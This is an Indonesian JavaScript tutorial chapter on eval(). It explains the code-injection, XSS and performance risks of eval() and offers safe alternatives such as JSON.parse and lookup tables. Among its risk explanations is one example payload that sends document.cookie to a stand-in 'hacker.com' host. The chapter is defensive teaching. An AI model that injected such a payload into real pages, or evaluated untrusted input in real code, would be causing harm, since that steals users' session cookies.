# 18 - Eval (Eksekusi Dinamis, Analisis Risiko Keamanan, dan Alternatif Aman)

> ⏱️ **TL;DR (Ringkasan Cepat):**
> * **Fungsi Utama**: Memahami fungsi bawaan `eval()` sebagai parser dan eksekutor ekspresi string kode JavaScript dinamis.
> * **Kapan Digunakan**: Memahami mengapa `eval()` **sangat berbahaya dan dijuluki 'eval is evil'** di industri software.
> * **Aturan Praktis**: Pegang prinsip emas: **'Never use eval()!'**.

## 1. 🎯 Tujuan Belajar
- Memahami fungsi bawaan `eval()` sebagai parser dan eksekutor ekspresi string kode JavaScript dinamis.
- Memahami mengapa `eval()` **sangat berbahaya dan dijuluki 'eval is evil'** di industri software.
- Menganalisis dampak negatif `eval()` terhadap keamanan (XSS, Code Injection) dan performa (hilangnya optimasi V8/JIT Compiler).
- Menguasai alternatif modern yang aman: `JSON.parse()`, objek Lookup Table, dan `new Function()` terisolasi.

---

## 2. 📖 Penjelasan Konsep

### 🎭 Analogi Dunia Nyata
> `eval()` seperti **memberikan kunci brankas master bank dan hak otorisasi penuh kepada sembarang orang asing yang datang lewat loket**: Anda berharap orang tersebut hanya ingin menukar uang koin, namun karena Anda memberinya wewenang mutlak, ia bisa menguras brankas atau membakar kantor bank Anda.

Fungsi **`eval(stringKode)`** adalah fungsi bawaan JavaScript yang mengevaluasi atau mengeksekusi string teks yang diterimanya seolah-olah teks tersebut adalah kode JavaScript asli yang diketik langsung oleh programmer.

### 1. Cara Kerja `eval()`
```javascript
const x = 10;
const y = 20;
const hasil = eval("x + y * 2"); // Menghasilkan 50
```

### 2. Mengapa Penggunaan `eval()` Dilarang Keras di Industri?
1. **Risiko Keamanan Ekstrem (Code Injection & XSS)**:
   Jika string yang dievaluasi berasal dari input pengguna, hacker dapat menyusupkan skrip jahat (*malicious code*) untuk mencuri token sesi, cookie, atau menguras saldo rekening:
   `eval(inputDariUser); // Bayangkan jika user memasukkan: 'fetch("https://hacker.com?stolen=" + document.cookie)'`
2. **Menghancurkan Optimasi Mesin JavaScript (JIT Compiler)**:
   Mesin JS modern seperti Google V8 mengoptimalkan kode dengan menganalisis scope variabel sebelum kode berjalan. Karena `eval()` bisa mengubah atau menciptakan variabel baru di sembarang scope lokal, V8 terpaksa mematikan seluruh optimasi mesin, membuat kode berjalan jauh lebih lambat.
3. **Pencemaran Scope & Kesulitan Debugging**:
   `eval()` dapat memanipulasi variabel di sekitarnya secara tidak terduga dan menghasilkan pesan error yang sangat sulit dilacak nomor barisnya (*stack trace*).

### 3. Alternatif Aman Modern Pengganti `eval()`
* **Jika butuh mengubah data teks menjadi objek**: Gunakan **`JSON.parse()`** murni.
* **Jika butuh kalkulasi matematika berdasarkan operator**: Gunakan **Kamus Fungsi (*Lookup Table*)**:
  ```javascript
  const kalkulator = {
    "+": (a, b) => a + b,
    "-": (a, b) => a - b,
    "*": (a, b) => a * b
  };
  ```
* **Jika benar-benar terpaksa butuh eksekusi kode dinamis terisolasi**: Gunakan konstruktor **`new Function()`** karena hanya dieksekusi di lingkup global (*tidak dapat mengakses scope lokal di sekitarnya*).

---

## 3. 💻 Contoh Kode (`example.js`)
```javascript
// Penjelasan lengkap materi ini dapat dilihat di README.md

console.log("--- 1. Cara Kerja Dasar eval() (Hanya untuk Demonstrasi Teori) ---");
const a = 15;
const b = 5;

// eval mengevaluasi string sebagai kode
const hasilKalkulasi = eval("a * b + 10");
console.log("Hasil evaluasi string 'a * b + 10':", hasilKalkulasi);

console.log("\n--- 2. Simulasi Bahaya Keamanan Code Injection ---");
// Bayangkan input ini berasal dari kolom form input website Anda:
const inputJahatDariHacker = "a + b; console.warn('[BAHAYA]: Akun Anda berhasil diretas oleh penyerang!');";

console.log("Mengeksekusi input pengguna tidak terpercaya:");
eval(inputJahatDariHacker);

console.log("\n--- 3. Alternatif Aman: Kamus Operasi (Lookup Table) ---");
// Alih-alih eval(angka1 + operator + angka2), buat fungsi pemetaan yang aman:
const operasiAman = {
  tambah: (x, y) => x + y,
  kurang: (x, y) => x - y,
  kali:   (x, y) => x * y,
  bagi:   (x, y) => y !== 0 ? x / y : "Error: Pembagian nol"
};

function hitungAman(x, y, tipeOperasi) {
  const aksi = operasiAman[tipeOperasi];
  if (!aksi) {
    throw new Error(`Operasi '${tipeOperasi}' tidak dikenal dan ditolak!`);
  }
  return aksi(x, y);
}

console.log("Hitung Aman (tambah) :", hitungAman(50, 25, "tambah"));
console.log("Hitung Aman (kali)   :", hitungAman(10, 4, "kali"));

console.log("\n--- 4. Alternatif Aman untuk Parsing Data: JSON.parse ---");
// JANGAN PERNAH gunakan eval('(' + jsonStr + ')')!
const jsonStr = '{"status": "sukses", "kode": 200}';
const dataObj = JSON.parse(jsonStr); // 100% aman dari eksekusi kode jahat
console.log("Hasil parse JSON aman:", dataObj.status);
```

---

## 4. 🖥️ Output yang Diharapkan
```text
--- 1. Cara Kerja Dasar eval() (Hanya untuk Demonstrasi Teori) ---
Hasil evaluasi string 'a * b + 10': 85

--- 2. Simulasi Bahaya Keamanan Code Injection ---
Mengeksekusi input pengguna tidak terpercaya:
[BAHAYA]: Akun Anda berhasil diretas oleh penyerang!

--- 3. Alternatif Aman: Kamus Operasi (Lookup Table) ---
Hitung Aman (tambah) : 75
Hitung Aman (kali)   : 40

--- 4. Alternatif Aman untuk Parsing Data: JSON.parse ---
Hasil parse JSON aman: sukses
```

---

## 5. 💡 Panduan Praktis & Studi Kasus


### 🏢 Real-World Use Case
1. **Taman Bermain Kode Online (REPL / Code Playground)**: Tool seperti DevTools Console atau CodePen membutuhkan eksekusi string dinamis (namun selalu dijalankan di lingkungan Sandbox web worker yang sangat terisolasi).
2. **Mesin Template & Compiler Internal**: Digunakan secara sangat hati-hati oleh tim inti pembuat bundler/transpiler seperti Babel.
3. **Saran Industri**: 99.9% aplikasi web komersial **sama sekali tidak membutuhkan `eval()`**.

### ⚠️ Common Pitfalls (Jebakan Umum)
- **Membuka Celah XSS Mematikan**: Memasukkan parameter URL atau data form ke `eval()` adalah tiket ekspres terjadinya serangan peretasan data pengguna.
- **Menghancurkan Kecepatan Aplikasi**: V8 engine tidak bisa mengoptimalkan variabel di sekitar `eval()` sehingga seluruh fungsi tempat `eval` berada akan mengalami degradasi kecepatan yang signifikan.
- **Diblokir oleh Content Security Policy (CSP)**: Website modern di produksi mengaktifkan CSP yang otomatis memblokir eksekusi `eval()` demi keamanan server.

### 🌟 Best Practice
- Pegang prinsip emas: **'Never use eval()!'**.
- Gunakan `JSON.parse()` murni saat ingin membaca struktur data dari string teks.
- Gunakan Lookup Table objek pemetaan fungsi untuk kalkulator atau pengeksekusi perintah berbasis teks.

---

## 6. ✍️ Latihan Mandiri
1. Buatlah fungsi `kalkulatorStringAman(angka1, operator, angka2)` yang mendukung operator `+`, `-`, `*`, dan `/` menggunakan teknik *Lookup Table* tanpa menggunakan `eval()`.
2. Jelaskan secara tertulis mengapa kode `JSON.parse('{"x": 10}')` jauh lebih aman dibandingkan dengan `eval('({"x": 10})')`.

---

## 7. 🧭 Navigasi
- ⬅️ **Sebelumnya:** [17 - Base64](../17-base64/README.md)
- 🏠 **Daftar Isi Modul 03:** [README Modul 03](../README.md)
- 📑 **Daftar Isi Utama:** [Kembali ke Root README](../../README.md)
